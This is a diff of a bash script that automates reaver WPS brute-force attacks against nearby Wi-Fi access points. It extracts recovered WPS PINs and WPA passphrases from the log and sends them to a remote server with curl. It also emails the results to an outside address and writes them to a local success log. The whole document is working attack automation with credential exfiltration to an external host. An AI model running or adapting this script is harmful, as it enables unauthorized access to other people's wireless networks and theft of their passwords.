@@ -28,17 +28,32 @@ do
     if echo $result|grep -q -i 'fail';then
         #echo 'begin pins bssid: ' $i
         curl "${URL_PREFIX}&act=set_current_pin_bssid&bssid=${i}"
-        /usr/local/bin/reaver -i $INTERFACE -b $i -a -v -o $LOG_FILE &
+        /usr/local/bin/reaver -i $INTERFACE -b $i -a -n -v -o $LOG_FILE &
         #$MONTOR_LOG_BIN $! $LOG_FILE
         echo "set current_reaver_pid $!" | redis-cli
         wait
         result=`tail -n3 $LOG_FILE`
         if echo $result|grep -q -i 'psk';then
-              echo $result|mutt -s 'get password' hackers365@gmail.com
-              echo "######################" >> /root/success.log
-              echo "bssid: $i">> /root/success.log
-              echo "$result" >> /root/success.log
-              echo "######################" >> /root/success.log
+            line_pin=`echo "$result"|grep 'WPS PIN'`
+            if [ -n "$line_pin" ]; then
+                pin=`echo $line_pin|cut -d"'" -f2`;
+                if [ -n $pin ]; then
+                    curl "${URL_PREFIX}&act=set_pin_psk&bssid=${i}&key=pin&value=${pin}"
+                fi
+            fi
+            line_psk=`echo "$result"|grep 'WPA PSK'`
+            if [ -n "$line_psk" ];then
+                psk=`echo $line_psk|cut -d"'" -f2`;
+                if [ -n $psk ]; then
+                    curl "${URL_PREFIX}&act=set_pin_psk&bssid=${i}&key=psk&value=${psk}"
+                fi
+            fi
+
+            echo "$result"|mutt -s 'get password' hackers365@gmail.com
+            echo "######################" >> /root/success.log
+            echo "bssid: $i">> /root/success.log
+            echo "$result" >> /root/success.log
+            echo "######################" >> /root/success.log
         fi
         echo "del current_pin_mac'" | redis-cli
         echo "del current_reaver_pid" | redis-cli
